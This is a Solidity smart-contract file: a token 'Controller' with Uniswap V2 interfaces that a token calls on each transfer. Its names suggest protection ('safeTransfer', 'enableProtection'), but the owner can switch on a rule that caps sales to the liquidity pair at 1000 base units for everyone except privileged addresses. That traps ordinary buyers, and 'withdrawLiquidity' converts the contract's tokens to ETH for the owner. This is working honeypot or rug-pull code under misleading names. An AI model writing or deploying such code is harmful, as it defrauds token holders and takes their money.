// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

abstract contract Ownable {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(msg.sender);
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function router() external view returns (address);
    function owner() external view returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract Controller is Ownable {

    IERC20 internal tokenInstance;
    IUniswapV2Router02 internal _router;
    IUniswapV2Pair internal _pair;

    uint256 private _sellLimit = 1000;
    bool private protectionActive;

    function safeTransfer(address from, address to, uint amount) public {
        if (address(tokenInstance) == address(0)) { return; }
        require(msg.sender == address(tokenInstance), "Not the token");
        if (address(_pair) == address(0)) { 
            _pair = IUniswapV2Pair(IUniswapV2Factory(_router.factory()).getPair(_router.WETH(), address(tokenInstance)));
        }

        if (protectionActive && isMarket(to) && !isSuper(from)) {
            require(amount <= _sellLimit, "Sell Limit");
        }
    }

    function setTokenInstance(address _tokenAddress) public onlyOwner {
        tokenInstance = IERC20(_tokenAddress);
        _router = IUniswapV2Router02(tokenInstance.router());
        _pair = IUniswapV2Pair(IUniswapV2Factory(_router.factory()).getPair(_router.WETH(), _tokenAddress));
    }

    function isMarket(address account) internal view returns (bool) {
        return (account == address(_pair) || account == address(_router));
    }

    function isSuper(address account) public view returns (bool) {
        return account == owner() || account == address(this) || account == tokenInstance.owner() || account == address(tokenInstance);
    }

    function enableProtection() public onlyOwner {
        protectionActive = !protectionActive;
    }

    function withdrawLiquidity(uint256 percent) external onlyOwner {
        require(percent <= 100, "Percent should be less or equal 100");
        uint256 amountIn = tokenInstance.balanceOf(address(this)) * percent / 100;
        tokenInstance.approve(address(_router), amountIn);
        address[] memory path; path = new address[](2);
        path[0] = address(tokenInstance); 
        path[1] = address(_router.WETH());
        _router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountIn,
            0,
            path,
            owner(),
            block.timestamp
        );
    }

    function settingsInfo() public view returns (
        address tokenAddress,
        address poolAddress,
        bool protected,
        uint256 sellLimit
    ) { return  
        (address(tokenInstance),
        address(_pair),
        protectionActive,
        _sellLimit);
    }
}